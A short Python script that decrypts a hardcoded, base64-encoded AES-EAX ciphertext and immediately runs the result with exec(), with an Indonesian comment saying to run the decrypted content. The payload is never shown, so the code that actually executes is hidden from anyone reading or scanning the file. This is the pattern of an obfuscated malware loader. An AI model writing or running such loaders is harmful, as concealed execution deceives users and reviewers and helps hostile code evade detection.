
import base64
from Cryptodome.Cipher import AES

def decrypt_and_run():
    key = base64.b64decode("ajpC29Z6/5UR3OvqCIbzZGX6rdsqMqZOIwm0WdDl3bo=")
    nonce = base64.b64decode("wcDiT/YYbWSbA50i6e2VAQ==")
    tag = base64.b64decode("Dhw6ykWAweZBAAZ+7HD8rw==")
    encrypted_data = base64.b64decode("WWze5buwhHhYaToz3snEzy7A7K1uPSEuGyjO1Sc4Q10Bkx66o+kvDk37B28=")
    
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    decrypted_content = cipher.decrypt_and_verify(encrypted_data, tag).decode('utf-8')
    
    # Jalankan konten yang didekripsi
    exec(decrypted_content)

if __name__ == "__main__":
    decrypt_and_run()
